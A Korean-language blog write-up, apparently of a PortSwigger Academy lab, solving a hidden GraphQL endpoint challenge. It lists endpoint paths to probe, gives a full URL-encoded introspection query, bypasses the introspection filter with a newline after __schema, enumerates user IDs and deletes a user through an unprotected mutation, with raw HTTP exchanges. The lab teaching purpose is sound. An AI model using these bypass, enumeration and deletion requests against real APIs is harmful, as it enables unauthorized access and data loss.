---
layout: post
title: "Burp Academy-GraphQL API 관련 취약점: Finding a hidden GraphQL endpoint"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, GraphQL]
toc: true
last_modified_at: 2023-11-15 09:50:00 +0900
---


# 개요
- GraphQL 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint
- 취약점 설명페이지: https://portswigger.net/web-security/graphql
- 난이도: PRACTITIONER (보통)

# 문제 개요
- 이 랩에 있는 유저 관리 기능에는 숨겨진 GraphQL 엔드포인트가 있다. 
- 단순히 웹 사이트의 기능을 클릭하는 것으로는 발견할 수 없다. 
- 또한 이 엔드포인트는 introspection에 대해서 어느정도 방어도 하고 있다. 
- 숨겨진 엔드포인트를 알아내서 carlos유저를 삭제하면 문제가 풀린다. 

```
The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

To solve the lab, find the hidden endpoint and delete carlos.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater, and enables you to scan the API schema.

For more information on using InQL, see Working with GraphQL in Burp Suite.
```

# 살펴보기 
- 일단 대충 사이트의 기능을 살펴봤는데 graphql 쿼리가 전송되는 부분은 보이지 않았다. 
- /graphql/v1 엔드포인트도 테스트해봤지만 404응답이었다. GET/POST양쪽다 
- Top페이지에 대해 InQL스캔을 돌려봤지만 introspection은 되지 않았다. 
- 특별히 웹 사이트에는 힌트가 될 만한 Javascript파일도 보이지 않는다. 

# 도전
- 알려진 GraphQL 엔드포인트 목록이 있지 않을까?
- [여기](https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/#:~:text=Examples%20of%20GraphQL%20endpoints,php%20%2Fgraphiql%20%2Fgraphiql.) 를 보면 몇 개 리스트가 적혀있다. 

이 것들을 테스트해본다. 

```
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
```

음.. 테스트 해본결과 이 것들도 아니었다. 모두 404응답이다. 모르겠다. 답을 보자! 

# 답보고 풀이 
## GraphQL 엔드포인트 알아내기 
1. `/api` 엔드포인트로 요청을 보냈을 때의 응답을 관찰한다. `"Query not present"`라는 응답이 돌아온다. 쿼리 파라메터가 없다고 하는 것을 보니 GraphQL 엔드포인트로 의심된다. 

(위에서 내 접근방식자체는 틀리지 않았다. `/api` 엔드포인트가 테스트 목록에 있었더라면...)

![`/api` 엔드포인트 응답](/images/burp-academy-graphql-3-1.png)

2. `/api?query=query{__typename}` 요청을 보내본다. GraphQL응답이 돌아온다. 

```
{
  "data": {
    "__typename": "query"
  }
}
```

![query{__typename} 요청 결과](/images/burp-academy-graphql-3-2.png)

## Introspection 시도

3. Grphaql 엔드포인트를 찾았다. Introspection 쿼리를 보내서 스키마 정보를 알아낸다. GET 파라메터로 보내야 하므로 URL인코딩된 introspection쿼리를 보내본다. 

```http
GET /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A HTTP/2

...
```

서버측 응답이다. introspection이 허용되지 않고 있다. 쿼리에 __schema나 __type키워드가 포함되어 있는 것을 체크하는 것으로 보인다. 

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=41d5dslnYWVovlvJlfccM7PtUs3q5KFk; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 156

{
  "errors": [
    {
      "locations": [],
      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
    }
  ]
}
```

## Introspection 방어 우회

4. Instrospection쿼리의 `__schema` 뒤에 뉴라인 캐릭터 `%0a`를 붙여서 보내본다. 
이는 혹시 서버측에서 `__schema{`가 포함된 문자열을 찾는 정규표현식으로 필터링을 하고 있다면 유효한 우회책이 된다. 

시도해보면 이번에는 서버측에서 Introspection결과를 돌려주는 것을 볼 수 있다! 

![방어우회](/images/burp-academy-graphql-3-3.png)

5. 서버의 응답을 json파일로 저장하고 InQL탭에서 읽어들인다. 그러면 분석된 결과를 볼 수 있다. 

![GraphQL 스키마 분석결과](/images/burp-academy-graphql-3-4.png)

## 유저 정보 얻어내기 

6. `getUser` 쿼리를 사용해서 사용자 정보를 얻어낸다. 

다음 쿼리에 변수를 직접입력해서 사용할 수 있다. 

```
query {
    getUser(id: Int!) {
        id
        username
    }
}
```

예를들면 다음과 같다.

```
query {
    getUser(id:1000) {
        id
        username
    }
}
```

위의 쿼리를 URL인코딩하면 다음과 같이 된다. 

`query%20%7B%0A%09getUser(id%3A1000)%20%7B%0A%09%09id%0A%09%09username%0A%09%7D%0A%7D`

7. 이 쿼리를 서버에 보내보면 존재하지 않는 유저인 경우에는 다음과 같이 null이 반환되는 것을 알 수 있다. 

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=aiDKVcE2de8RaMedcUp6YLzUYHh6xEMt; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 39

{
  "data": {
    "getUser": null
  }
}
```

8. userid를 1부터 시도해본다. 그러면 id가 3인 유저가 carlos인 것을 알 수 있다. 

![carlos유저 확인](/images/burp-academy-graphql-3-5.png)

## carlos 유저 삭제 

9. InQL에서 얻어낸 정보중에서 deleteOrganizationUser쿼리를 사용해서 carlos유저를 삭제한다. 

```
mutation {
    deleteOrganizationUser(input: DeleteOrganizationUserInput) {
        user {
            id
            username
        }
    }
}
```

파라메터 DeleteOrganizationUserInput를 변수직접입력 방식으로 바꾸면 `{id:3}`이 된다. 

```
mutation {
	deleteOrganizationUser(input:{id:3}) {
		user {
			id
		}
	}
}
```

10. 이 것을 URL인코딩해서 서버에 보낸다. 

```http
GET /api?query=mutation%20%7B%0A%09deleteOrganizationUser(input%3A%7Bid%3A3%7D)%20%7B%0A%09%09user%20%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D HTTP/2
Host: 0ac2001703bb09f680a89f98001d0088.web-security-academy.net
...
```

그러면 유저 삭제에 성공했다는 메세지가 반환된다. 

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=G2FKEMzMPJSRUvKR6LF0FbuFYW4qXZyD; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 97

{
  "data": {
    "deleteOrganizationUser": {
      "user": {
        "id": 3
      }
    }
  }
}
```

![carlos유저 삭제 성공](/images/burp-academy-graphql-3-6.png)

11. 그리고 웹 브라우저를 리로드하면 문제 풀이에 성공했다는 메세지가 출력된다. 

![풀이 성공](/images/burp-academy-graphql-3-success.png)